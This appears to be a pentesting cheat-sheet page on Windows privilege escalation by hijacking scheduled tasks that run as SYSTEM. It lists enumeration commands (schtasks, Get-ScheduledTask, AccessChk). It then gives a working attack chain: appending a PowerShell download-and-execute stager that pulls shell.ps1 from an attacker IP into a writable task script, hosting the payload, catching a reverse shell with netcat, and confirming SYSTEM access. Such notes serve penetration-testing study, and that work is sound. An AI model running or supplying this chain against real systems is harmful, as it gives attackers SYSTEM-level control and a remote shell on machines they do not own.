---
title: Scheduled Tasks
date: 2026-06-26 17:45:23
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Misconfigurations
tags:
  - Privilege-Escalation
  - Windows
  - SYSTEM
  - PowerShell
  - AccessChk
  - Scheduled-Tasks
  - Task-Scheduler
  - schtasks
  - Get-ScheduledTask
  - Task-Hijacking
  - Writable-Scripts
  - Writable-Binaries
  - Persistence
---

> Scheduled Tasks automate actions such as backups, maintenance, and system updates, if a task runs with elevated privileges ( SYSTEM ) and executes a script or binary that we can modify, we can inject our own code, wait for the task to execute, and obtain code execution as SYSTEM.

### Enumeration

> Enumerate all scheduled tasks.

```cmd
schtasks /query /fo LIST /v
```

> Or via PowerShell.

```powershell
Get-ScheduledTask | Select-Object TaskPath, TaskName, State
```

> Inspect a scheduled task to determine the executable or script it launches.

```cmd
schtasks /query /tn "<task_path>\<task_name>" /fo LIST /v
```

> Or via PowerShell.

```powershell
(Get-ScheduledTask -TaskPath "<task_path>" -TaskName "<task_name>").Actions
```

> Review the following fields:

>   * Task To Run / Action : executable or script executed by the task.
>
>   * Run As User : account used to execute the task.
>
>   * Next Run Time : indicates when the payload will execute.
>
>

> We are interested in tasks that run as `SYSTEM` (or another privileged account) and execute a file we can modify.

### Exploitation

> Check whether the file executed by the scheduled task is writable.

```cmd
accesschk64.exe /accepteula -quvw "<executed_file>"
```

> Or recursively check every file within the target directory.

```cmd
accesschk64.exe /accepteula -quvw -s "<directory>"
```

> If the executed script is writable, append a download-and-execute stager that pulls our payload.

```powershell
Add-Content C:\Scripts\backup.ps1 "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/shell.ps1')"
```

> Host the payload and start a listener.

```bash
python3 -m http.server 80
```

> Catch the incoming shell

```bash
nc -lvnp <port>
```

> Wait for the scheduled task to execute.

```cmd
whoami

nt authority\system
```
